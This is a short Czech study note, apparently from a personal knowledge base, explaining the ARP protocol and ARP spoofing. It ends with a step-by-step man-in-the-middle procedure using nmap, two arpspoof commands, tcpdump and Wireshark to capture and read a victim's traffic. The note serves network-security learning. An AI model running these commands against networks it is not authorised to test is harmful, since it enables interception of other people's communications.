## `ARP`
- Address Resolution Protocol
- preklada IP adresu na MAC v ramci LAN
- ARP request = broadcast na vsechna zarizeni a "kdo ma IP `<IP>` posli svoji MAC!"
- odpovi pouze zarizeni s danou IP adresou pomoci **ARP reply (unicast)**
- uklada se do ARP cache (aby se dotaz nemusel opakovat)

## ARP spoofing
- pokus o vydavani se za MAC adresu jineho zarizeni
- **utok** pri kterem utocnik
	- posila falesne ARP reply
	- tvrdi, ze je gateway, jiny host...
- [[MITM]]


## utok

pouzijeme nastroj `arpspoof`.

nejprve musime zjistit svoji IP adresu:
``` bash
ip a
```

nasledne musime sit proskenovat
``` bash
nmap <IP/MASK>
```

otevreme 2 terminaly (1 pro obet -> server a druhy pro server -> obet)
prvni:
``` bash
sudo arpspoof -i <sitove_rozhrani> -t <IP obeti> <IP serveru>
```
druhy:
``` bash
sudo arpspoof -i <sitove_rozhrani> -t <IP serveru> <IP obeti>
```

do toho si otevreme jeste treti terminal, abychom si provoz zaznamenali (`tcpdump`) *nebo GUI*  `wireshark`:
``` bash
sudo tcpdump -w <vystup.pcap> -i <sitove_rozhrani> port <port>
```

nasledne pouzijeme na analyzu `wireshark`.
``` bash
wireshark <vystup.pcap>
```

Ted uz staci jenom projit pozadavky, rozkliknout je a zjistit, co nas zajima.

[[analyza sitoveho provozu]]
[[pojmy]]
[[network scan]]
[[OSI model]] (L2)